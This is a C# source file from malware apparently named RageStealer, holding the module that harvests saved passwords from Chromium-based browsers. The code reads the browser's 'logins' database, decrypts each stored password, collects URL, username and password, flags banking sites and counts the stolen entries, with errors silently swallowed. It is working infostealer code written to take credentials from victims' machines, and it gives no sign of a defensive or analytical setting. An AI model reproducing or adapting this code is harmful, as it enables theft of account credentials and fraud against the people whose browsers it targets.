using System.Collections.Generic;
using RageStealer.Helper;
using RageStealer.Helpers;

namespace RageStealer.Target.Browsers.Chromium;

internal sealed class Passwords
{
	public static List<Password> Get(string sLoginData)
	{
		List<Password> list = new List<Password>();
		try
		{
			SqLite sqLite = SqlReader.ReadTable(sLoginData, "logins");
			if (sqLite == null)
			{
				return list;
			}
			for (int i = 0; i < sqLite.GetRowCount(); i++)
			{
				try
				{
					Password password = default(Password);
					password.Url = Crypto.GetUtf8(sqLite.GetValue(i, 0));
					password.Username = Crypto.GetUtf8(sqLite.GetValue(i, 3));
					Password item = password;
					string value = sqLite.GetValue(i, 5);
					if (value != null)
					{
						item.Pass = Crypto.GetUtf8(Crypto.EasyDecrypt(sLoginData, value));
						list.Add(item);
						Banking.ScanData(item.Url);
						Counter.Passwords++;
					}
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
		return list;
	}
}
